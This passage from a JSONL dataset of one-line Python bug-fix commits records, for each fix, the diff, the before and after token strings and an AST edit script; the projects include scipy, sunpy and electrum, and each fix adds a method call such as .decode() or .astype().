0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "populo", "commit_sha": "2f8d7e8cbed530694063b80dfa644b94339b52ae", "parent_sha": "6d7fe5619abbdf03d9a7552603684ec6dd31e14c", "file_path": "common/lib/xmodule/xmodule/open_ended_grading_classes/controller_query_service.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ class ControllerQueryService(GradingService):\n     def check_combined_notifications(self, course_id, student_id, user_is_staff, last_time_viewed):\n         params = {\n             'student_id': student_id,\n-            'course_id': course_id,\n+            'course_id': course_id.to_deprecated_string(),\n             'user_is_staff': user_is_staff,\n             'last_time_viewed': last_time_viewed,\n         }\n", "before": "params = { 'student_id' : student_id , 'course_id' : course_id , 'user_is_staff' : user_is_staff , 'last_time_viewed' : last_time_viewed , }", "after": "params = { 'student_id' : student_id , 'course_id' : course_id . to_deprecated_string ( ) , 'user_is_staff' : user_is_staff , 'last_time_viewed' : last_time_viewed , }", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"pair\", 3, 13, 3, 35], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:course_id\", 3, 26, 3, 35], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:to_deprecated_string\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "scipy", "commit_sha": "d2b5014c2af7d139b253de68a4223a37571b7c38", "parent_sha": "2619f0ca030b2bcf630ddd9a33f48c588cf4fcea", "file_path": "scipy/io/netcdf.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -290,7 +290,7 @@ class netcdf_file(object):\n         if (typecode, size) not in REVERSE:\n             raise ValueError(\"NetCDF 3 does not support type %s\" % type)\n \n-        data = empty(shape_, dtype=type)\n+        data = empty(shape_, dtype=type.newbyteorder(\"B\")) #convert to big endian always for NetCDF 3\n         self.variables[name] = netcdf_variable(data, typecode, size, shape, dimensions)\n         return self.variables[name]\n \n", "before": "data = empty ( shape_ , dtype = type )", "after": "data = empty ( shape_ , dtype = type . newbyteorder ( \"B\" ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 30, 3, 40], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:type\", 3, 36, 3, 40], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:newbyteorder\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:\\\"B\\\"\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "scipy", "commit_sha": "9566fc0f20c6b7a8a0f3ea8f29da94ccf74755da", "parent_sha": "5c2bef4c8cdd8dcd4594088a80382a19a2d42034", "file_path": "scipy/linalg/tests/test_lapack.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -778,7 +778,7 @@ def test_sgesdd_lwork_bug_workaround():\n         p.terminate()\n \n     assert_equal(returncode, 0,\n-                 \"Code apparently failed: \" + p.stdout.read())\n+                 \"Code apparently failed: \" + p.stdout.read().decode())\n \n \n class TestSytrd(object):\n", "before": "assert_equal ( returncode , 0 , \"Code apparently failed: \" + p . stdout . read ( ) )", "after": "assert_equal ( returncode , 0 , \"Code apparently failed: \" + p . stdout . read ( ) . decode ( ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 47, 3, 60], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 47, 3, 60], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 47, 3, 60], [\"identifier:decode\", \"T\"], 2], [\"Move\", \"N0\", [\"attribute\", 3, 47, 3, 60], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "scipy", "commit_sha": "26734b5a296be8507b3a9520f169c374082103e2", "parent_sha": "6c0f25e4aff3653381f48f65af4f3eca315f7ee7", "file_path": "scipy/io/wavfile.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -691,7 +691,7 @@ def write(filename, rate, data):\n     >>> t = np.linspace(0., 1., samplerate)\n     >>> amplitude = np.iinfo(np.int16).max\n     >>> data = amplitude * np.sin(2. * np.pi * fs * t)\n-    >>> write(\"example.wav\", samplerate, data)\n+    >>> write(\"example.wav\", samplerate, data.astype(np.int16))\n \n", "before": "write ( \"example.wav\" , samplerate , data )", "after": "write ( \"example.wav\" , samplerate , data . astype ( np . int16 ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 14, 3, 47], [\"call\", \"N0\"], 5], [\"Insert\", [\"argument_list\", 3, 14, 3, 47], [\"):)\", \"T\"], 6], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:data\", 3, 42, 3, 46], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:astype\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 46, 3, 47], 2], [\"Insert\", \"N3\", [\"identifier:np\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:int16\", \"T\"], 2]]"}
{"project": "smart-cache", "commit_sha": "f889fef67d35631b5c70a942f6a79bcddcf0134c", "parent_sha": "23994f2e1fcd028ece4ee02756b6a1b49e397db8", "file_path": "scripts/DataAnalysis/simulator.py", "project_url": "https://github.com/Cloud-PG/smart-cache", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -602,7 +602,7 @@ def main():\n                 [simulator_exe, 'version'],\n                 shell=True,\n             )\n-            ver_file.write(output)\n+            ver_file.write(output.decode('ascii'))\n \n         processes = []\n \n", "before": "ver_file . write ( output )", "after": "ver_file . write ( output . decode ( 'ascii' ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 27, 3, 35], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 27, 3, 35], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:output\", 3, 28, 3, 34], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'ascii'\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 34, 3, 35], 2]]"}
{"project": "vmware-nsx", "commit_sha": "9df431db73f7c43ff4f536397b93ba458df418f9", "parent_sha": "4e4909515613931c1e89fd89897cd917fc67cb6a", "file_path": "neutron/plugins/ml2/drivers/type_vxlan.py", "project_url": "https://github.com/gkotton/vmware-nsx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -153,7 +153,7 @@ class VxlanTypeDriver(type_tunnel.TunnelTypeDriver):\n         session = db_api.get_session()\n         with session.begin(subtransactions=True):\n             # remove from table unallocated tunnels not currently allocatable\n-            allocs = session.query(VxlanAllocation)\n+            allocs = session.query(VxlanAllocation).with_lockmode(\"update\")\n             for alloc in allocs:\n                 try:\n                     # see if tunnel is allocatable\n", "before": "allocs = session . query ( VxlanAllocation )", "after": "allocs = session . query ( VxlanAllocation ) . with_lockmode ( \"update\" )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 22, 3, 52], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 22, 3, 52], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 22, 3, 52], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:with_lockmode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:\\\"update\\\"\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "vmware-nsx", "commit_sha": "f74d20cb642f0f34b3030ca161fb3087474894a6", "parent_sha": "4dc760f6935aa59796a69ef10cb087303ef00809", "file_path": "neutron/tests/unit/hyperv/test_hyperv_neutron_agent.py", "project_url": "https://github.com/gkotton/vmware-nsx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,7 +54,7 @@ class TestHyperVNeutronAgent(base.BaseTestCase):\n \n         mock.patch('neutron.openstack.common.loopingcall.'\n                    'FixedIntervalLoopingCall',\n-                   new=MockFixedIntervalLoopingCall)\n+                   new=MockFixedIntervalLoopingCall).start()\n         cfg.CONF.set_default('firewall_driver',\n                              'neutron.agent.firewall.NoopFirewallDriver',\n                              group='SECURITYGROUP')\n", "before": "mock . patch ( 'neutron.openstack.common.loopingcall.' 'FixedIntervalLoopingCall' , new = MockFixedIntervalLoopingCall )", "after": "mock . patch ( 'neutron.openstack.common.loopingcall.' 'FixedIntervalLoopingCall' , new = MockFixedIntervalLoopingCall ) . start ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 1, 9, 3, 53], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 1, 9, 3, 53], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 1, 9, 3, 53], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:start\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "pan-baidu-download", "commit_sha": "df31721d100ce4f0f36244024c6aed675263972a", "parent_sha": "59187913becf640a4676d95b2e63fe7b536a3929", "file_path": "bddown_core.py", "project_url": "https://github.com/dovalsama/pan-baidu-download", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -202,7 +202,7 @@ class FileInfo(object):\n     def match(self, js):\n         _filename = re.search(self.filename_pattern, js)\n         if _filename:\n-            self.filename = _filename.group(1)\n+            self.filename = _filename.group(1).decode('unicode_escape')\n         data = re.findall(self.pattern, js)\n         if not data:\n             return False\n", "before": "self . filename = _filename . group ( 1 )", "after": "self . filename = _filename . group ( 1 ) . decode ( 'unicode_escape' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 29, 3, 47], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 29, 3, 47], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 29, 3, 47], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'unicode_escape'\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "pan-baidu-download", "commit_sha": "d92f2f18282ffa2ecf47e22375d8deac2c55eb51", "parent_sha": "ced958f9b7dff550953a88afccd5f8d3bd2a6f07", "file_path": "command/show.py", "project_url": "https://github.com/dovalsama/pan-baidu-download", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -13,5 +13,5 @@ def show(links):\n         for url in links:\n             pan = Pan()\n             info = pan.get_dlink(url)\n-            print(u\"{0}\\n{1}\\n\\n\".format(info.filename, info.dlink))\n+            print(u\"{0}\\n{1}\\n\\n\".format(info.filename, info.dlink).encode('utf-8'))\n     sys.exit(0)\n", "before": "print ( u\"{0}\\n{1}\\n\\n\" . format ( info . filename , info . dlink ) )", "after": "print ( u\"{0}\\n{1}\\n\\n\" . format ( info . filename , info . dlink ) . encode ( 'utf-8' ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 19, 3, 68], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 19, 3, 68], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 19, 3, 68], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "sterp", "commit_sha": "23de6df72efe90dc58e087f907aaf85ea1135a5a", "parent_sha": "52b049145bb5dce6cef0b178f91a839dfab2c166", "file_path": "setup/doctype/setup_control/setup_control.py", "project_url": "https://github.com/gangadharkadam/sterp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -256,7 +256,7 @@ def create_territories():\n \t\tif name and not webnotes.conn.exists(\"Territory\", name):\n \t\t\twebnotes.bean({\n \t\t\t\t\"doctype\": \"Territory\",\n-\t\t\t\t\"territory_name\": name,\n+\t\t\t\t\"territory_name\": name.replace(\"'\", \"\"),\n \t\t\t\t\"parent_territory\": root_territory,\n \t\t\t\t\"is_group\": \"No\"\n \t\t\t}).insert()\n", "before": "webnotes . bean ( { \"doctype\" : \"Territory\" , \"territory_name\" : name , \"parent_territory\" : root_territory , \"is_group\" : \"No\" } ) . insert ( )", "after": "webnotes . bean ( { \"doctype\" : \"Territory\" , \"territory_name\" : name . replace ( \"'\" , \"\" ) , \"parent_territory\" : root_territory , \"is_group\" : \"No\" } ) . insert ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"pair\", 3, 5, 3, 27], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:name\", 3, 23, 3, 27], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:\\\"'\\\"\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:\\\"\\\"\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "beba-ctrl", "commit_sha": "65b1d94da0ffe3b38205d452fe8ba7dd5e1c811d", "parent_sha": "734133612b810b9376ff8eb5ba135a21f55d8c9e", "file_path": "ryu/base/app_manager.py", "project_url": "https://github.com/beba-eu/beba-ctrl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -223,7 +223,7 @@ class AppManager(object):\n \n     def close(self):\n         def close_all(close_dict):\n-            for app in close_dict:\n+            for app in close_dict.values():\n                 close_method = getattr(app, 'close', None)\n                 if callable(close_method):\n                     close_method()\n", "before": "for app in close_dict : close_method = getattr ( app , 'close' , None ) if callable ( close_method ) : close_method ( )", "after": "for app in close_dict . values ( ) : close_method = getattr ( app , 'close' , None ) if callable ( close_method ) : close_method ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 13, 6, 35], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:close_dict\", 3, 24, 3, 34], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:values\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "ubuntu-tweak", "commit_sha": "8d606ec2165e8f77b48eeba4d76e2148e1143879", "parent_sha": "1982b92130abb53cacc52d0b5248134dfe3c3211", "file_path": "src/preferences.py", "project_url": "https://github.com/muzena/ubuntu-tweak", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -87,7 +87,7 @@ class PreferencesDialog:\n                 MODULE_TITLE, _('None')\n         )\n         for module in module_list:\n-            icon = gtk.gdk.pixbuf_new_from_file(os.path.join(DATA_DIR, 'pixmaps', module[MODULE_LOGO]))\n+            icon = gtk.gdk.pixbuf_new_from_file(os.path.join(DATA_DIR, 'pixmaps', module[MODULE_LOGO])).scale_simple(18, 18, gtk.gdk.INTERP_NEAREST)\n \n             iter = model.append(None)\n \n", "before": "icon = gtk . gdk . pixbuf_new_from_file ( os . path . join ( DATA_DIR , 'pixmaps' , module [ MODULE_LOGO ] ) )", "after": "icon = gtk . gdk . pixbuf_new_from_file ( os . path . join ( DATA_DIR , 'pixmaps' , module [ MODULE_LOGO ] ) ) . scale_simple ( 18 , 18 , gtk . gdk . INTERP_NEAREST )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 20, 3, 104], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 20, 3, 104], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 104], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:scale_simple\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"integer:18\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"integer:18\", \"T\"], 3], [\"Insert\", \"N1\", [\",:,\", \"T\"], 4], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 5], [\"Insert\", \"N1\", [\"):)\", \"T\"], 6], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:INTERP_NEAREST\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:gtk\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:gdk\", \"T\"], 2]]"}
{"project": "luigi-slack", "commit_sha": "c0d5d6ad6c6e344db6ed691284f6fffa6ea26e22", "parent_sha": "e652ecd4a64f1a8d9c531c42e3c17ee9bf1a6b3c", "file_path": "slack.py", "project_url": "https://github.com/gerardobort/luigi-slack", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -94,7 +94,7 @@ class DownloadSlackChannelHistory(luigi.Task):\n                     message[\"ts\"],\n                     message.get(\"user\"),\n                     message.get(\"is_starred\"),\n-                    message.get(\"text\").encode('ascii', 'ignore').replace(\"\\n\", \"\\\\n\"),\n+                    message.get(\"text\").encode('ascii', 'ignore').replace(\"\\n\", \"\\\\n\").replace(\"\\t\", \"\\\\t\"),\n                 )\n                 print(*info, file=outfile, sep='\\t')\n \n", "before": "message . get ( \"text\" ) . encode ( 'ascii' , 'ignore' ) . replace ( \"\\n\" , \"\\\\n\" ) ,", "after": "message . get ( \"text\" ) . encode ( 'ascii' , 'ignore' ) . replace ( \"\\n\" , \"\\\\n\" ) . replace ( \"\\t\" , \"\\\\t\" ) ,", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 21, 3, 87], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 21, 3, 87], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 21, 3, 87], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:\\\"\\\\t\\\"\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:\\\"\\\\\\\\t\\\"\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "electrum", "commit_sha": "e05c8439e6f729ad6230a58f1fc6260454fc1033", "parent_sha": "dcd50c3467d9de778de9d0e4db3836ec84c6d1cc", "file_path": "plugins/trustedcoin/trustedcoin.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -563,7 +563,7 @@ class TrustedCoinPlugin(BasePlugin):\n             key = regenerate_key(pk)\n             compressed = is_compressed(pk)\n             sig = key.sign_message(message, compressed)\n-            return base64.b64encode(sig)\n+            return base64.b64encode(sig).decode()\n \n         signatures = [f(x) for x in [xprv1, xprv2]]\n         r = server.reset_auth(short_id, challenge, signatures)\n", "before": "return base64 . b64encode ( sig )", "after": "return base64 . b64encode ( sig ) . decode ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 20, 3, 41], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 20, 3, 41], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 41], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "sunpy", "commit_sha": "bf4bc878dde297624da465fee229d3b2b03f6f20", "parent_sha": "6043140f8fb61283e065d50bb6052fafc16598c9", "file_path": "sunpy/map/basemap.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -406,7 +406,7 @@ class BaseMap(np.ndarray):\n         data = np.asarray(self)[y_pixels[0]:y_pixels[1], \n                                 x_pixels[0]:x_pixels[1]]\n \n-        return self.__class__(data, header)\n+        return self.__class__(data.copy(), header)\n    \n     @toggle_pylab\n     def plot(self, overlays=None, draw_limb=True, gamma=None, draw_grid=False, \n", "before": "return self . __class__ ( data , header )", "after": "return self . __class__ ( data . copy ( ) , header )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 44], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 30, 3, 44], [\"):)\", \"T\"], 5], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:data\", 3, 31, 3, 35], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:copy\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"):)\", 3, 43, 3, 44], 1]]"}
{"project": "sunpy", "commit_sha": "a08ce873692897704b2e40246f3e7fdd9234e195", "parent_sha": "8182a1a879897485436d68cd59455dc9c7f03f8e", "file_path": "sunpy/map/mapbase.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -258,7 +258,7 @@ Dimension:\\t [%d, %d]\n     def rsun_arcseconds(self):\n         \"\"\"Radius of the sun in arcseconds\"\"\"\n         return self.meta.get('rsun_obs', self.meta.get('solar_r',\n-                                         self.meta.get('radius', constants.average_angular_size.value)))\n+                                         self.meta.get('radius', constants.average_angular_size.to('arcsec').value)))\n \n     @property\n     def coordinate_system(self):\n", "before": "return self . meta . get ( 'rsun_obs' , self . meta . get ( 'solar_r' , self . meta . get ( 'radius' , constants . average_angular_size . value ) ) )", "after": "return self . meta . get ( 'rsun_obs' , self . meta . get ( 'solar_r' , self . meta . get ( 'radius' , constants . average_angular_size . to ( 'arcsec' ) . value ) ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 66, 3, 102], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 66, 3, 102], [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 66, 3, 96], 0], [\"Move\", \"N1\", [\".:.\", 3, 96, 3, 97], 1], [\"Insert\", \"N1\", [\"identifier:to\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'arcsec'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "sunpy", "commit_sha": "f42020331749b1e288a2140147909d823079bcc6", "parent_sha": "8d808c20ecfcbd6d14914d4732d008e220caeca1", "file_path": "sunpy/image/tests/test_coalignment.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ def aia171_test_shift():\n \n @pytest.fixture\n def aia171_test_map_layer(aia171_test_map):\n-    return aia171_test_map.data\n+    return aia171_test_map.data.astype('float32')  # SciPy 1.4 requires at least 16-bit floats\n \n \n @pytest.fixture\n", "before": "return aia171_test_map . data", "after": "return aia171_test_map . data . astype ( 'float32' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 5, 3, 32], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 12, 3, 32], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:astype\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'float32'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "condex", "commit_sha": "b4bb7af1b8e8d0585be9e7ec32dbb3cd512fb81a", "parent_sha": "9f006791f728bebd6a9fbed6fd3e0a4ba8c774a5", "file_path": "Tasks.py", "project_url": "https://github.com/R4stl1n/condex", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -229,7 +229,7 @@ def perform_algo_task():\n                         logger.debug(coinsElgibleForIncrease)\r\n                         while len(coinsAboveThreshold) >= 1:\r\n \r\n-                            akey = coinsAboveThreshold[0]\r\n+                            akey = coinsAboveThreshold.keys()[0]\r\n                             \r\n                             # Check to see if we still have coins to increase\r\n                             if len(coinsElgibleForIncrease) >= 1:\r\n", "before": "akey = coinsAboveThreshold [ 0 ]", "after": "akey = coinsAboveThreshold . keys ( ) [ 0 ]", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"subscript\", 3, 36, 3, 58], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:coinsAboveThreshold\", 3, 36, 3, 55], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:keys\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "typhoonae", "commit_sha": "c4776a334fb9c5038cc39c6275fa366671e50f9f", "parent_sha": "6b82b1e9fbbdc0d1cb3c06d115aa11ab7f71ad14", "file_path": "src/typhoonae/blobstore/handlers.py", "project_url": "https://github.com/fajoy/typhoonae", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -128,7 +128,7 @@ class UploadCGIHandler(object):\n         if match == None:\n             return fp\n \n-        upload_session_key = match.group(1)\n+        upload_session_key = match.group(1).strip('/')\n \n         try:\n             upload_session = google.appengine.api.datastore.Get(\n", "before": "upload_session_key = match . group ( 1 )", "after": "upload_session_key = match . group ( 1 ) . strip ( '/' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 30, 3, 44], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 30, 3, 44], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 30, 3, 44], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:strip\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'/'\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
